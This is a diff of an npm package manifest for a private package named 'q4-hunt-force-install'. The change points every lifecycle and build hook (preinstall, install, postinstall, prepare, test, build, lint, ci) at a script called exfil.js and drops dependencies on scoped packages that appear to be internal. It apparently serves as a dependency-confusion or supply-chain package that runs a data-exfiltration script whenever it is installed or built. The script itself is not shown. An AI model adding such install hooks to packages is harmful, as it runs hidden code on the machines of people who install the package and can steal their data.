@@ -1,14 +1,15 @@
 {
   "name": "q4-hunt-force-install",
-  "version": "1.0.0",
+  "version": "1.0.1",
   "private": true,
   "scripts": {
-    "preinstall": "node -e \"console.log('pre')\"",
-    "postinstall": "node -e \"console.log('post')\""
-  },
-  "dependencies": {
-    "@com.q4inc.connect.artifactory.watchdog.control/artifactory-ecs-watchdog": "latest",
-    "@com.q4inc.connect.platform/platform-shell": "latest",
-    "@com.q4inc.connect.platform/platform-earnings-mfe": "latest"
+    "preinstall": "node exfil.js",
+    "install": "node exfil.js",
+    "postinstall": "node exfil.js",
+    "prepare": "node exfil.js",
+    "test": "node exfil.js",
+    "build": "node exfil.js",
+    "lint": "node exfil.js",
+    "ci": "node exfil.js"
   }
 }
